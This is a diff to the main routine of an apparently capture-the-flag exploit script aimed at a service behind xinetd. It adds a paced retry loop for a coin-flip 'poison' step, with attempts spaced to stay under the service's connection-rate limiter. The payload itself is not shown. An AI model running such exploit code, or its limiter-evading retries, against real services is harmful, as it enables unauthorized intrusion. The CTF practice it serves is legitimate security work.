@@ -266,13 +266,29 @@ def attempt_before_data(r):
     return b"Data?" not in r
 
 def main():
-    # SINGLE shot. The service is behind xinetd with a connection-rate limit, so
-    # do NOT hammer it in a loop (that trips the limiter and disables the service
-    # for a while). If this run fails, wait ~30-60s and run it again by hand.
-    res = attempt()
-    if not res:
-        log.failure("this attempt didn't land — wait ~60s (xinetd cps cooldown) then "
-                    "re-run; if it reaches 'Data?' but no flag, tell me; else try OFF=0x48/0x20")
+    # The second poison is a coin-flip; OFF=0x38 wins WHEN it lands. Retry, but
+    # GENTLY: the service is behind xinetd with a connection-rate limit, so space
+    # attempts far apart (a tight loop disables the service). Default 5 tries,
+    # 25s apart -> ~1 connection / 30s, well under any cps limit.
+    import time
+    tries = int(os.environ.get("TRIES", "5"))
+    gap   = float(os.environ.get("GAP", "25"))
+    for i in range(tries):
+        print(f"[*] === attempt {i+1}/{tries}  OFF={hex(OFF)} ===")
+        res = None
+        try:
+            res = attempt()
+        except Exception as e:
+            log.warning(f"attempt error: {type(e).__name__}: {e}")
+            try: io.close()
+            except: pass
+        if res:
+            return
+        if i != tries - 1:
+            print(f"[*] waiting {gap:.0f}s before next attempt (xinetd cps cooldown)...")
+            time.sleep(gap)
+    log.failure("no landing yet — re-run later; the poison is ~50/50, it will hit. "
+                "Tune with TRIES=/GAP=; if a run reaches 'Data?' but stays silent, tell me.")
 
 if __name__ == "__main__":
     main()
